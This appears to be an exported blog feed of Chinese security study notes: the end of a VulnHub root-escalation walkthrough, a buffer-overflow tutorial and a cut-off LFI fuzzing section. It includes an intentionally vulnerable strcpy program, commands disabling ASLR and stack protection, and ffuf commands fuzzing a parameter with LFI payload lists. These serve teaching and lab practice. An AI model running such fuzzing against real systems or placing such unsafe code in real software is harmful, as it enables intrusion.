src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231122492.png" alt="image-20230623112240125"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231126971.png" alt="image-20230623112424506"></p><p>1.进入tmp目录，因为其他目录没有写入文档的权限</p><p>2.下载文档</p><p>3.编译</p><p>4.发现有执行权限，不需要修改文件属性</p><p>5.执行文件，得到root权限</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231126224.png" alt="image-20230623112656399"></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buffer Overflows:part-1</title>
      <link href="/2023/06/18/Buffer-Overflows-part-1/"/>
      <url>/2023/06/18/Buffer-Overflows-part-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>简而言之，缓冲区溢出是由不正确的程序代码引起的，CPU无法正确处理过多的数据，因此可能会操纵CPU的处理。例如，假设有太多数据被写入到不受限制的保留内存缓冲区或堆栈中。在这种情况下，特定的寄存器将被覆盖，这可能允许代码被执行。<br>缓冲区溢出可能导致程序崩溃、损坏数据或损坏程序运行时的数据结构。最后一种可以用任意数据覆盖特定程序的返回地址，使攻击者能够以易受缓冲区溢出影响的进程的权限执行命令，从而通过传递任意机器代码。此代码通常旨在让我们更方便地访问系统，以便将其用于自己的目的。这种缓冲区在普通服务器中溢出，互联网蠕虫也会利用客户端软件。<br>Unix系统上一个特别流行的目标是root访问，它赋予我们所有人访问系统的权限。然而，正如人们经常误解的那样，这并不意味着“仅”导致标准用户权限的缓冲区溢出是无害的。如果您已经拥有用户权限，那么获得令人垂涎的root访问权限通常会容易得多。<br>缓冲区溢出，除了编程疏忽之外，主要是由基于冯·诺依曼体系结构的计算机系统造成的。<br>缓冲区溢出的最重要原因是使用的编程语言不会自动监控内存缓冲区或堆栈的限制，以防止（基于堆栈的）缓冲区溢出。其中包括C和C++语言，它们强调性能，不需要监控。<br>由于这个原因，开发人员被迫在编程代码中自己定义这些区域，这会多次增加漏洞。出于测试目的或由于疏忽，这些区域通常未定义。即使它们用于测试目的，在开发过程结束时也可能被忽略。<br>但是，并不是每个应用程序环境都可能出现缓冲区溢出的情况。例如，由于Java处理内存管理的方式，独立的Java应用程序与其他应用程序相比不太可能。Java使用“垃圾收集”技术来管理内存，这有助于防止缓冲区溢出的情况。</p><span id="more"></span><h1 id="Stack-Based-Buffer-Overflow"><a href="#Stack-Based-Buffer-Overflow" class="headerlink" title="Stack-Based Buffer Overflow"></a>Stack-Based Buffer Overflow</h1><p>内存异常是操作系统对现有软件中的错误或在执行这些软件时的反应。这是过去十年中程序流中大多数安全漏洞的原因。使用C或C++等低抽象语言编程时，由于疏忽，经常会发生编程错误，导致缓冲区溢出。 这些语言几乎直接编译成机器代码，与Java或Python等高度抽象的语言不同，它们运行的操作系统几乎没有控制结构。缓冲区溢出是指允许数据过大而无法放入操作系统内存中不够大的缓冲区，从而溢出该缓冲区的错误。由于这种错误处理，被执行程序的其他函数的内存被覆盖，可能会产生安全漏洞。 这样的程序（二进制文件）是存储在数据存储介质上的通用可执行文件。这种可执行二进制文件有几种不同的文件格式。例如，可移植可执行文件格式（PE）在Microsoft平台上使用。 可执行文件的另一种格式是可执行文件和链接格式（ELF），几乎所有现代UNIX变体都支持它。如果链接器加载这样一个可执行的二进制文件，并且程序将被执行，则相应的程序代码将被加载到主存储器中，然后由CPU执行。 程序在初始化和执行期间将数据和指令存储在内存中。这些是显示在执行的软件中或由用户输入的数据。特别是对于预期的用户输入，必须通过保存输入预先创建缓冲区。 这些指令用于对程序流进行建模。除其他外，返回地址存储在存储器中，该存储器引用其他存储器地址，从而定义程序的控制流。如果使用缓冲区溢出故意覆盖此类返回地址，则攻击者可以通过使返回地址引用另一个函数或子例程来操纵程序流。此外，还可以跳回到先前由用户输入引入的代码。</p><p>当程序被调用时，部分被映射到进程中的段，并且段被加载到内存中，如ELF文件所述。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/buffer_overflow_1.png" alt="image"></p><p>. text:部分包含程序的实际汇编指令。此区域可以是只读的，以防止进程意外修改其指令。任何写入该区域的尝试都将不可避免地导致分段错误。 </p><p>.data:部分包含由程序显式初始化的全局变量和静态变量。</p><p> .bss: 一些编译器和链接器使用.bss部分作为数据段的一部分，该数据段包含完全由0位表示的静态分配变量。</p><p>堆栈内存是一种后进先出的数据结构，其中存储了返回地址、参数以及帧指针，具体取决于编译器选项。C&#x2F;C++局部变量存储在这里，您甚至可以将代码复制到堆栈中。堆栈是RAM中定义的区域。链接器保留这个区域，通常将堆栈放在全局变量和静态变量上方RAM的较低区域。内容通过堆栈指针访问，该指针在初始化期间设置为堆栈的上端。在执行过程中，堆栈中分配的部分向下扩展到较低的内存地址。 现代内存保护（DEP&#x2F;ASLR）可以防止缓冲区溢出造成的损坏。DEP（数据执行保护），将内存区域标记为“只读”。只读内存区域是存储一些用户输入的地方（例如：堆栈），因此DEP背后的想法是防止用户将外壳代码上传到内存，然后将指令指针设置为外壳代码。黑客开始利用ROP（Return-Oriented Programming）来绕过这一点，因为它允许他们将外壳代码上传到可执行空间，并使用现有的调用来执行它。使用ROP，攻击者需要知道存储东西的内存地址，因此，针对它的防御措施是实现ASLR（地址空间布局随机化），它将所有东西存储在哪里随机化，从而使ROP更加困难。 用户可以通过泄露内存地址绕过ASLR，但这会降低漏洞利用的可靠性，有时甚至不可能。例如，“Freefloat FTP服务器”在Windows XP（DEP&#x2F;ASLR之前）上很难利用。然而，如果应用程序在现代Windows操作系统上运行，则存在缓冲区溢出，但由于DEP&#x2F;ASLR，目前利用缓冲区溢出并不容易，因为没有已知的方法泄漏内存地址。</p><h2 id="Vulnerable-Program"><a href="#Vulnerable-Program" class="headerlink" title="Vulnerable Program"></a>Vulnerable Program</h2><p>我们现在编写一个名为bow.C的简单C程序，该程序带有一个称为strcpy（）的易受攻击的函数。</p><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int bowfunc(char *string) &#123;    char buffer[1024];    strcpy(buffer, string);    return 1;&#125;int main(int argc, char *argv[]) &#123;    bowfunc(argv[1]);    printf(&quot;Done.\n&quot;);    return 1;&#125;</code></pre><p>现代操作系统具有针对此类漏洞的内置保护，如地址空间布局随机化（ASLR）。为了学习缓冲区溢出利用的基本知识，我们将禁用以下内存保护功能：</p><pre><code class="shell-session">student@nix-bow:~$ sudo suroot@nix-bow:/home/student# echo 0 &gt; /proc/sys/kernel/randomize_va_spaceroot@nix-bow:/home/student# cat /proc/sys/kernel/randomize_va_space</code></pre><pre><code class="shell-session">student@nix-bow:~$ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32student@nix-bow:~$ file bow32 | tr &quot;,&quot; &quot;\n&quot;bow: ELF 32-bit LSB shared object Intel 80386 version 1 (SYSV) dynamically linked interpreter /lib/ld-linux.so.2 for GNU/Linux 3.2.0 BuildID[sha1]=93dda6b77131deecaadf9d207fdd2e70f47e1071 not stripped</code></pre><h2 id="Vulnerable-C-Functions"><a href="#Vulnerable-C-Functions" class="headerlink" title="Vulnerable C Functions"></a>Vulnerable C Functions</h2><ul><li><code>strcpy</code></li><li><code>gets</code></li><li><code>sprintf</code></li><li><code>scanf</code></li><li><code>strcat</code></li><li>…</li></ul><h2 id="GDB-Introductions"><a href="#GDB-Introductions" class="headerlink" title="GDB Introductions"></a>GDB Introductions</h2><p>或称GNU调试器，是GNU项目开发的Linux系统的标准调试器。它已经移植到许多系统，并支持编程语言C、C++、Objective-C、FORTRAN、Java等。 GDB为我们提供了常见的可跟踪特性，如断点或堆栈跟踪输出，并允许我们干预程序的执行。例如，它还允许我们操作应用程序的变量，或者独立于程序的正常执行来调用函数。 我们使用GNU调试器（GDB）在汇编程序级别查看创建的二进制文件。一旦我们用GDB执行了二进制程序，我们就可以反汇编程序的主要功能。</p><h4 id="GDB-AT-amp-T-Syntax"><a href="#GDB-AT-amp-T-Syntax" class="headerlink" title="GDB - AT&amp;T Syntax"></a>GDB - AT&amp;T Syntax</h4><pre><code class="shell-session">student@nix-bow:~$ gdb -q bow32Reading symbols from bow...(no debugging symbols found)...done.(gdb) disassemble mainDump of assembler code for function main:   0x00000582 &lt;+0&gt;: lea    0x4(%esp),%ecx   0x00000586 &lt;+4&gt;: and    $0xfffffff0,%esp   0x00000589 &lt;+7&gt;: pushl  -0x4(%ecx)   0x0000058c &lt;+10&gt;:push   %ebp   0x0000058d &lt;+11&gt;:mov    %esp,%ebp   0x0000058f &lt;+13&gt;:push   %ebx   0x00000590 &lt;+14&gt;:push   %ecx   0x00000591 &lt;+15&gt;:call   0x450 &lt;__x86.get_pc_thunk.bx&gt;   0x00000596 &lt;+20&gt;:add    $0x1a3e,%ebx   0x0000059c &lt;+26&gt;:mov    %ecx,%eax   0x0000059e &lt;+28&gt;:mov    0x4(%eax),%eax   0x000005a1 &lt;+31&gt;:add    $0x4,%eax   0x000005a4 &lt;+34&gt;:mov    (%eax),%eax   0x000005a6 &lt;+36&gt;:sub    $0xc,%esp   0x000005a9 &lt;+39&gt;:push   %eax   0x000005aa &lt;+40&gt;:call   0x54d &lt;bowfunc&gt;   0x000005af &lt;+45&gt;:add    $0x10,%esp   0x000005b2 &lt;+48&gt;:sub    $0xc,%esp   0x000005b5 &lt;+51&gt;:lea    -0x1974(%ebx),%eax   0x000005bb &lt;+57&gt;:push   %eax   0x000005bc &lt;+58&gt;:call   0x3e0 &lt;puts@plt&gt;   0x000005c1 &lt;+63&gt;:add    $0x10,%esp   0x000005c4 &lt;+66&gt;:mov    $0x1,%eax   0x000005c9 &lt;+71&gt;:lea    -0x8(%ebp),%esp   0x000005cc &lt;+74&gt;:pop    %ecx   0x000005cd &lt;+75&gt;:pop    %ebx   0x000005ce &lt;+76&gt;:pop    %ebp   0x000005cf &lt;+77&gt;:lea    -0x4(%ecx),%esp   0x000005d2 &lt;+80&gt;:ret    End of assembler dump.</code></pre><p>在第一列中，十六进制数字表示内存地址。带加号（+）的数字以字节为单位显示内存中的地址跳跃，用于相应的指令。接下来，我们可以看到带有寄存器及其操作后缀的汇编指令（助记符）。当前的语法是AT&amp;T，我们可以通过%和$字符来识别它。</p><table><thead><tr><th><strong>Memory Address</strong></th><th><strong>Address Jumps</strong></th><th><strong>Assembler Instruction</strong></th><th><strong>Operation Suffixes</strong></th></tr></thead><tbody><tr><td>0x00000582</td><td>&lt;+0&gt;:</td><td>lea</td><td>0x4(%esp),%ecx</td></tr><tr><td>0x00000586</td><td>&lt;+4&gt;:</td><td>and</td><td>$0xfffffff0,%esp</td></tr><tr><td>…</td><td>…</td><td>…</td><td>…</td></tr></tbody></table><p>Intel语法使分解后的表示更易于阅读，我们可以通过在GDB中输入以下命令来更改语法：</p><h4 id="GDB-Change-the-Syntax-to-Intel"><a href="#GDB-Change-the-Syntax-to-Intel" class="headerlink" title="GDB - Change the Syntax to Intel"></a>GDB - Change the Syntax to Intel</h4><pre><code class="shell-session">(gdb) set disassembly-flavor intel(gdb) disassemble mainDump of assembler code for function main:   0x00000582 &lt;+0&gt;:    lea    ecx,[esp+0x4]   0x00000586 &lt;+4&gt;:    and    esp,0xfffffff0   0x00000589 &lt;+7&gt;:    push   DWORD PTR [ecx-0x4]   0x0000058c &lt;+10&gt;:push   ebp   0x0000058d &lt;+11&gt;:mov    ebp,esp   0x0000058f &lt;+13&gt;:push   ebx   0x00000590 &lt;+14&gt;:push   ecx   0x00000591 &lt;+15&gt;:call   0x450 &lt;__x86.get_pc_thunk.bx&gt;   0x00000596 &lt;+20&gt;:add    ebx,0x1a3e   0x0000059c &lt;+26&gt;:mov    eax,ecx   0x0000059e &lt;+28&gt;:mov    eax,DWORD PTR [eax+0x4]&lt;SNIP&gt;</code></pre><p>我们不必不断地手动更改显示模式。我们还可以使用以下命令将其设置为默认语法。</p><h4 id="Change-GDB-Syntax"><a href="#Change-GDB-Syntax" class="headerlink" title="Change GDB Syntax"></a>Change GDB Syntax</h4><pre><code class="shell-session">student@nix-bow:~$ echo &#39;set disassembly-flavor intel&#39; &gt; ~/.gdbinit</code></pre><h4 id="GDB-Intel-Syntax"><a href="#GDB-Intel-Syntax" class="headerlink" title="GDB - Intel Syntax"></a>GDB - Intel Syntax</h4><p>如果我们现在重新运行GDB并反汇编主函数，我们会看到Intel语法。</p><pre><code class="shell-session">student@nix-bow:~$ gdb ./bow32 -qReading symbols from bow...(no debugging symbols found)...done.(gdb) disassemble mainDump of assembler code for function main:   0x00000582 &lt;+0&gt;: lea    ecx,[esp+0x4]   0x00000586 &lt;+4&gt;: and    esp,0xfffffff0   0x00000589 &lt;+7&gt;: push   DWORD PTR [ecx-0x4]   0x0000058c &lt;+10&gt;:push   ebp   0x0000058d &lt;+11&gt;:mov    ebp,esp   0x0000058f &lt;+13&gt;:push   ebx   0x00000590 &lt;+14&gt;:push   ecx   0x00000591 &lt;+15&gt;:call   0x450 &lt;__x86.get_pc_thunk.bx&gt;   0x00000596 &lt;+20&gt;:add    ebx,0x1a3e   0x0000059c &lt;+26&gt;:mov    eax,ecx   0x0000059e &lt;+28&gt;:mov    eax,DWORD PTR [eax+0x4]   0x000005a1 &lt;+31&gt;:add    eax,0x4   0x000005a4 &lt;+34&gt;:mov    eax,DWORD PTR [eax]   0x000005a6 &lt;+36&gt;:sub    esp,0xc   0x000005a9 &lt;+39&gt;:push   eax   0x000005aa &lt;+40&gt;:call   0x54d &lt;bowfunc&gt;   0x000005af &lt;+45&gt;:add    esp,0x10   0x000005b2 &lt;+48&gt;:sub    esp,0xc   0x000005b5 &lt;+51&gt;:lea    eax,[ebx-0x1974]   0x000005bb &lt;+57&gt;:push   eax   0x000005bc &lt;+58&gt;:call   0x3e0 &lt;puts@plt&gt;   0x000005c1 &lt;+63&gt;:add    esp,0x10   0x000005c4 &lt;+66&gt;:mov    eax,0x1   0x000005c9 &lt;+71&gt;:lea    esp,[ebp-0x8]   0x000005cc &lt;+74&gt;:pop    ecx   0x000005cd &lt;+75&gt;:pop    ebx   0x000005ce &lt;+76&gt;:pop    ebp   0x000005cf &lt;+77&gt;:lea    esp,[ecx-0x4]   0x000005d2 &lt;+80&gt;:ret    End of assembler dump.</code></pre><p>AT&amp;T和Intel语法之间的区别不仅在于指令及其符号的表示方式，还在于指令执行和读取的顺序和方向。 让我们以以下说明为例：</p><pre><code class="shell-session">  0x0000058d &lt;+11&gt;:mov    ebp,esp</code></pre><p>对于英特尔语法，我们对示例中的指令有以下顺序：</p><table><thead><tr><th><strong>Instruction</strong></th><th><strong><code>Destination</code></strong></th><th><strong>Source</strong></th></tr></thead><tbody><tr><td>mov</td><td><code>ebp</code></td><td>esp</td></tr></tbody></table><p>AT&amp;T语法</p><table><thead><tr><th><strong>Instruction</strong></th><th><strong>Source</strong></th><th><strong><code>Destination</code></strong></th></tr></thead><tbody><tr><td>mov</td><td>%esp</td><td><code>%ebp</code></td></tr></tbody></table><h4 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h4><pre><code>target：10.129.42.190“bowfunc”函数在“main”函数的哪个地址被调用？</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306242126805.png" alt="image-20230624212632094"></p><h1 id="CPU-Registers"><a href="#CPU-Registers" class="headerlink" title="CPU Registers"></a>CPU Registers</h1><p>寄存器是CPU的重要组成部分。几乎所有寄存器都提供了少量的存储空间，可以临时存储数据。然而，它们中的一些具有特定的功能。 这些寄存器将分为通用寄存器、控制寄存器和段寄存器。我们需要的最重要的寄存器是通用寄存器。在这些寄存器中，进一步细分为数据寄存器、指针寄存器和索引寄存器。</p><h4 id="Data-registers"><a href="#Data-registers" class="headerlink" title="Data registers"></a>Data registers</h4><table><thead><tr><th><strong>32-bit Register</strong></th><th><strong>64-bit Register</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>EAX</code></td><td><code>RAX</code></td><td>Accumulator is used in input&#x2F;output and for arithmetic operations 累加器用于输入&#x2F;输出和算术运算</td></tr><tr><td><code>EBX</code></td><td><code>RBX</code></td><td>Base is used in indexed addressing基址用于索引寻址</td></tr><tr><td><code>ECX</code></td><td><code>RCX</code></td><td>Counter is used to rotate instructions and count loops计数器用于旋转指令和计数循环</td></tr><tr><td><code>EDX</code></td><td><code>RDX</code></td><td>Data is used for I&#x2F;O and in arithmetic operations for multiply and divide operations involving large values数据用于I&#x2F;O和涉及大值的乘除运算的算术运算</td></tr></tbody></table><h4 id="Pointer-registers"><a href="#Pointer-registers" class="headerlink" title="Pointer registers"></a>Pointer registers</h4><table><thead><tr><th><strong>32-bit Register</strong></th><th><strong>64-bit Register</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>EIP</code></td><td><code>RIP</code></td><td>Instruction Pointer stores the offset address of the next instruction to be executed指令指针存储要执行的下一条指令的偏移地址</td></tr><tr><td><code>ESP</code></td><td><code>RSP</code></td><td>Stack Pointer points to the top of the stack堆栈指针指向堆栈顶部</td></tr><tr><td><code>EBP</code></td><td><code>RBP</code></td><td>Base Pointer is also known as <code>Stack Base Pointer</code> or <code>Frame Pointer</code> thats points to the base of the stack基址指针也称为堆栈基址指针或帧指针，指向堆栈的基址</td></tr></tbody></table><h2 id="Stack-Frames"><a href="#Stack-Frames" class="headerlink" title="Stack Frames"></a>Stack Frames</h2><p>由于堆栈从高地址开始，并随着值的添加而向下扩展到低内存地址，因此与指向堆栈顶部的堆栈指针相比，“基指针”指向堆栈的开头（基）。 随着堆栈的增长，它在逻辑上被划分为称为堆栈帧的区域，这些区域为相应的函数分配堆栈中所需的内存。堆栈帧定义了一个具有开始（EBP）和结束（ESP）的数据帧，当调用函数时，该帧被推送到堆栈上。 由于堆栈内存建立在后进先出（LIFO）数据结构上，因此第一步是存储堆栈上的上一个EBP位置，该位置可以在函数完成后恢复。如果我们现在来看bowfunc函数，它在GDB中看起来如下：</p><pre><code class="shell-session">(gdb) disas bowfunc Dump of assembler code for function bowfunc:   0x0000054d &lt;+0&gt;:    push   ebp       # &lt;---- 1. Stores previous EBP   0x0000054e &lt;+1&gt;:    mov    ebp,esp   0x00000550 &lt;+3&gt;:    push   ebx   0x00000551 &lt;+4&gt;:    sub    esp,0x404   &lt;...SNIP...&gt;   0x00000580 &lt;+51&gt;:leave     0x00000581 &lt;+52&gt;:ret    </code></pre><p>堆栈帧中的EBP是在调用函数时首先设置的，并且包含前一堆栈帧的EBP。接下来，ESP的值被复制到EBP，从而创建一个新的堆栈帧。</p><pre><code class="shell-session">(gdb) disas bowfunc Dump of assembler code for function bowfunc:   0x0000054d &lt;+0&gt;:    push   ebp       # &lt;---- 1. Stores previous EBP   0x0000054e &lt;+1&gt;:    mov    ebp,esp   # &lt;---- 2. Creates new Stack Frame   0x00000550 &lt;+3&gt;:    push   ebx   0x00000551 &lt;+4&gt;:    sub    esp,0x404    &lt;...SNIP...&gt;   0x00000580 &lt;+51&gt;:leave     0x00000581 &lt;+52&gt;:ret    </code></pre><p>然后在堆栈中创建一些空间，将ESP移动到顶部，用于所需和处理的操作和变量。</p><pre><code class="shell-session">(gdb) disas bowfunc Dump of assembler code for function bowfunc:   0x0000054d &lt;+0&gt;:    push   ebp       # &lt;---- 1. Stores previous EBP   0x0000054e &lt;+1&gt;:    mov    ebp,esp   # &lt;---- 2. Creates new Stack Frame   0x00000550 &lt;+3&gt;:    push   ebx   0x00000551 &lt;+4&gt;:    sub    esp,0x404 # &lt;---- 3. Moves ESP to the top   &lt;...SNIP...&gt;   0x00000580 &lt;+51&gt;:leave     0x00000581 &lt;+52&gt;:ret    </code></pre><p>这三条指令代表了所谓的序言。 为了摆脱堆栈框架，相反的做法是结束语。在结束语中，ESP被当前EBP替换，其值被重置为之前在序言中的值。结语相对较短，除了执行它的其他可能性外，在我们的示例中，它使用两个指令执行：</p><pre><code class="shell-session">(gdb) disas bowfunc Dump of assembler code for function bowfunc:   0x0000054d &lt;+0&gt;:    push   ebp          0x0000054e &lt;+1&gt;:    mov    ebp,esp      0x00000550 &lt;+3&gt;:    push   ebx   0x00000551 &lt;+4&gt;:    sub    esp,0x404    &lt;...SNIP...&gt;   0x00000580 &lt;+51&gt;:leave  # &lt;----------------------   0x00000581 &lt;+52&gt;:ret    # &lt;--- Leave stack frame</code></pre><h4 id="Index-registers"><a href="#Index-registers" class="headerlink" title="Index registers"></a>Index registers</h4><table><thead><tr><th><strong>Register 32-bit</strong></th><th><strong>Register 64-bit</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>ESI</code></td><td><code>RSI</code></td><td>Source Index is used as a pointer from a source for string operations 源索引用作字符串操作的源的指针</td></tr><tr><td><code>EDI</code></td><td><code>RDI</code></td><td>Destination is used as a pointer to a destination for string operations Destination用作指向字符串操作的目标的指针</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>关于汇编程序表示的另一个重要点是寄存器的命名。这取决于二进制文件的编译格式。我们已经使用GCC以32位格式编译了bow.c代码。现在，让我们将相同的代码编译成64位格式。</p><pre><code class="shell-session">student@nix-bow:~$ gcc bow.c -o bow64 -fno-stack-protector -z execstack -m64student@nix-bow:~$ file bow64 | tr &quot;,&quot; &quot;\n&quot;bow64: ELF 64-bit LSB shared object x86-64 version 1 (SYSV) dynamically linked interpreter /lib64/ld-linux-x86-64.so.2 for GNU/Linux 3.2.0 BuildID[sha1]=9503477016e8604e808215b4babb250ed25a7b99 not stripped</code></pre><p>因此，如果我们现在查看汇编代码，我们会发现地址是32位编译二进制的两倍大，并且我们拥有几乎一半的指令。</p><pre><code class="shell-session">student@nix-bow:~$ gdb -q bow64Reading symbols from bow64...(no debugging symbols found)...done.(gdb) disas mainDump of assembler code for function main:   0x00000000000006bc &lt;+0&gt;: push   rbp   0x00000000000006bd &lt;+1&gt;: mov    rbp,rsp   0x00000000000006c0 &lt;+4&gt;: sub    rsp,0x10   0x00000000000006c4 &lt;+8&gt;:  mov    DWORD PTR [rbp-0x4],edi   0x00000000000006c7 &lt;+11&gt;:mov    QWORD PTR [rbp-0x10],rsi   0x00000000000006cb &lt;+15&gt;:mov    rax,QWORD PTR [rbp-0x10]   0x00000000000006cf &lt;+19&gt;:add    rax,0x8   0x00000000000006d3 &lt;+23&gt;:mov    rax,QWORD PTR [rax]   0x00000000000006d6 &lt;+26&gt;:mov    rdi,rax   0x00000000000006d9 &lt;+29&gt;:call   0x68a &lt;bowfunc&gt;   0x00000000000006de &lt;+34&gt;:lea    rdi,[rip+0x9f]   0x00000000000006e5 &lt;+41&gt;:call   0x560 &lt;puts@plt&gt;   0x00000000000006ea &lt;+46&gt;:mov    eax,0x1   0x00000000000006ef &lt;+51&gt;:leave     0x00000000000006f0 &lt;+52&gt;:ret    End of assembler dump.</code></pre><p>然而，我们将首先看一下易受攻击的二进制文件的32位版本。现在对我们来说最重要的指令是调用指令。调用指令用于调用函数并执行两个操作：</p><ol><li>它将返回地址推送到堆栈上，使得程序的执行可以在函数成功实现其目标之后继续，</li><li>它将指令指针（EIP）更改为调用目的地并在那里开始执行。</li></ol><h4 id="GDB-Intel-Syntax-1"><a href="#GDB-Intel-Syntax-1" class="headerlink" title="GDB - Intel Syntax"></a>GDB - Intel Syntax</h4><pre><code class="shell-session">student@nix-bow:~$ gdb ./bow32 -qReading symbols from bow...(no debugging symbols found)...done.(gdb) disassemble mainDump of assembler code for function main:   0x00000582 &lt;+0&gt;: lea    ecx,[esp+0x4]   0x00000586 &lt;+4&gt;: and    esp,0xfffffff0   0x00000589 &lt;+7&gt;: push   DWORD PTR [ecx-0x4]   0x0000058c &lt;+10&gt;:push   ebp   0x0000058d &lt;+11&gt;:mov    ebp,esp   0x0000058f &lt;+13&gt;:push   ebx   0x00000590 &lt;+14&gt;:push   ecx   0x00000591 &lt;+15&gt;:call   0x450 &lt;__x86.get_pc_thunk.bx&gt;   0x00000596 &lt;+20&gt;:add    ebx,0x1a3e   0x0000059c &lt;+26&gt;:mov    eax,ecx   0x0000059e &lt;+28&gt;:mov    eax,DWORD PTR [eax+0x4]   0x000005a1 &lt;+31&gt;:add    eax,0x4   0x000005a4 &lt;+34&gt;:mov    eax,DWORD PTR [eax]   0x000005a6 &lt;+36&gt;:sub    esp,0xc   0x000005a9 &lt;+39&gt;:push   eax   0x000005aa &lt;+40&gt;:call   0x54d &lt;bowfunc&gt;# &lt;--- CALL function&lt;SNIP&gt;</code></pre><h2 id="Endianness"><a href="#Endianness" class="headerlink" title="Endianness"></a>Endianness</h2><p>在寄存器和存储器中的加载和保存操作期间，字节以不同的顺序读取。这种字节顺序称为字节序。端性是区分小端格式和大端格式的。 大端序和小端序是关于价的顺序。在大端序中，具有最高化合价的数字最初是。在小端序中，具有最低化合价的数字位于开头。大型机处理器使用big-endian格式，一些RISC体系结构，小型计算机，在TCP&#x2F;IP网络中，字节顺序也是big-endia格式。 现在，让我们来看一个具有以下值的示例：</p><ul><li>Address: <code>0xffff0000</code></li><li>Word: <code>\xAA\xBB\xCC\xDD</code></li></ul><table><thead><tr><th><strong>Memory Address</strong></th><th><strong>0xffff0000</strong></th><th><strong>0xffff0001</strong></th><th><strong>0xffff0002</strong></th><th><strong>0xffff0003</strong></th></tr></thead><tbody><tr><td>Big-Endian</td><td>AA</td><td>BB</td><td>CC</td><td>DD</td></tr><tr><td>Little-Endian</td><td>DD</td><td>CC</td><td>BB</td><td>AA</td></tr></tbody></table><p>当我们必须告诉CPU它应该指向哪个地址时，这对我们以后以正确的顺序输入代码非常重要。</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File_inclusion:Automation and Prevention</title>
      <link href="/2023/06/17/File-inclusion-Automation-and-Prevention/"/>
      <url>/2023/06/17/File-inclusion-Automation-and-Prevention/</url>
      
        <content type="html"><![CDATA[<h1 id="Automated-Scanning"><a href="#Automated-Scanning" class="headerlink" title="Automated Scanning"></a>Automated Scanning</h1><p>了解文件包含攻击是如何工作的，以及我们如何手动制作高级有效载荷并使用自定义技术来实现远程代码执行，这一点至关重要。这是因为在许多情况下，我们要利用该漏洞，可能需要与其特定配置相匹配的自定义负载。此外，在处理WAF或防火墙等安全措施时，我们必须运用我们的理解来了解特定的有效负载&#x2F;角色是如何被阻止的，并试图制定一个自定义的有效负载来绕过它。<br>在许多琐碎的情况下，我们可能不需要手动利用LFI漏洞。有许多自动化方法可以帮助我们快速识别和利用微不足道的LFI漏洞。我们可以使用模糊化工具来测试大量常见的LFI有效载荷，看看其中是否有任何一个有效，或者我们可以使用专门的LFI工具来测试这些漏洞。</p><span id="more"></span><hr><h2 id="Fuzzing-Parameters"><a href="#Fuzzing-Parameters" class="headerlink" title="Fuzzing Parameters"></a>Fuzzing Parameters</h2><p>用户可以在web应用程序前端使用的HTML表单往往经过适当的测试，并能很好地抵御不同的web攻击。然而，在许多情况下，页面可能有其他未链接到任何HTML表单的公开参数，因此普通用户永远不会访问或无意中造成伤害。这就是为什么对公开的参数进行模糊处理可能很重要，因为它们往往不如公共参数那么安全。</p><p>一旦我们确定了一个未链接到我们测试的任何表单的公开参数，我们就可以执行本模块中讨论的所有LFI测试。这不仅适用于LFI漏洞，也适用于其他模块中讨论的大多数web漏洞，因为暴露的参数也可能容易受到任何其他漏洞的攻击。</p><hr><h2 id="LFI-wordlists"><a href="#LFI-wordlists" class="headerlink" title="LFI wordlists"></a>LFI wordlists</h2><p>到目前为止，在本模块中，我们一直在手动制作LFI有效载荷，以测试LFI漏洞。这是因为手动测试更可靠，可以发现LFI漏洞，否则可能无法识别，如前所述。然而，在许多情况下，我们可能想对参数进行快速测试，看看它是否容易受到任何常见LFI负载的攻击，这可能会为我们在需要测试各种漏洞的web应用程序中节省时间。<br>我们可以使用许多LFI单词列表进行此扫描。LFI-Jhadix.txt是一个很好的单词列表，因为它包含各种旁路和公共文件，所以可以很容易地同时运行几个测试。我们可以用这个单词表来模糊？language&#x3D;我们在整个模块中一直在测试的参数，如下所示：</p><pre><code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&#39; -fs 2287</code></pre><hr><h2 id="Fuzzing-Server-Files"><a href="#Fuzzing-Server-Files" class="headerlink" title="Fuzzing Server Files"></a>Fuzzing Server Files</h2><p>除了模糊LFI有效载荷外，还有不同的服务器文件可能有助于我们利用LFI，因此了解这些文件存在于何处以及我们是否可以读取它们将很有帮助。这些文件包括：服务器webroot路径、服务器配置文件和服务器日志。</p><hr><h4 id="Server-Webroot"><a href="#Server-Webroot" class="headerlink" title="Server Webroot"></a>Server Webroot</h4><p>在某些情况下，我们可能需要知道完整的服务器webroot路径才能完成利用。例如，如果我们想定位我们上传的文件，但我们无法通过相对路径（例如..&#x2F;..&#x2F;uploads）到达其&#x2F;uploads目录。在这种情况下，我们可能需要找出服务器的webroot路径，以便我们可以通过绝对路径而不是相对路径来定位上传的文件。<br>为此，我们可以通过常见的webroot路径对index.php文件进行模糊处理，我们可以在Linux的单词列表 <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">wordlist for Linux</a> 或Windows的单词列表 <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">wordlist for Windows</a>中找到这些路径。根据我们的LFI情况，我们可能需要添加一些后台目录（例如..&#x2F;..&#x2F;..&#x2F;），然后添加我们的index.php后缀。</p><pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 